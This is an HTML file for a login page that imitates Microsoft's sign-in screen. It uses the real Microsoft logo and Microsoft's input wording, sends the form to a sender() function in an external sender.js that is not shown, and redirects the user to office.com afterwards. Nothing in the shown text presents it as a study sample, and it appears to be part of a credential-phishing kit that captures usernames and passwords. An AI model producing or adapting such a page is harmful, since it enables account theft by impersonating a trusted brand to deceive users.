<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link rel="stylesheet" href="style.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
</head>
<body>
    <div class="login-container">
        <div class="login-form">
            <div class="logo">
                <img src="https://logincdn.msauth.net/shared/5/images/microsoft_logo_ee5c8d9fb6248c938fd0.svg" alt="Microsoft Logo">
            </div>
            <h2>Sign in</h2>
            <form action="" onsubmit="return sender()">
                <div class="input-group">
                    <input type="text" id="username" name="username" required placeholder="Email, phone, or Skype">
                </div>
                <div class="input-group">
                    <input type="password" id="email" name="password" required placeholder="Password">
                </div>
                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>
                <div class="button-container">
                    <button type="submit" class="login-button">Sign In</button>
                  </div>
                <div class="create-account">
                    <p>No account? <a href="#">Create one!</a></p>
                </div>
                <input type="hidden" name="_next" value="https://www.office.com/">
            </form>
        </div>
    </div>
    <script src="sender.js"></script>

  
</body>
</html>
